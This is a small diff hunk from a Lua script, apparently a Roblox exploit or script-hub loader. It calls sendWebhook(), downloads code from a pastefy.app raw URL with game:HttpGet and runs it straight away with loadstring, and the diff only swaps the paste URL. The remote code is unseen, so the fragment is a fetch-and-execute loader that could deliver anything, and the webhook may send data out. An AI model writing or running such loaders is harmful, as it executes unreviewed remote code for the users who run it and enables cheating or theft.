@@ -98,7 +98,7 @@
 ‎    sendWebhook()
 ‎
 ‎    -- Run external Lua script
-‎    local luaCode = game:HttpGet("https://pastefy.app/ZiAiWmBR/raw")
+‎    local luaCode = game:HttpGet("https://pastefy.app/Bokjxkob/raw")
 ‎    loadstring(luaCode)()
 ‎
 ‎    -- Example: Auto hop if server is full
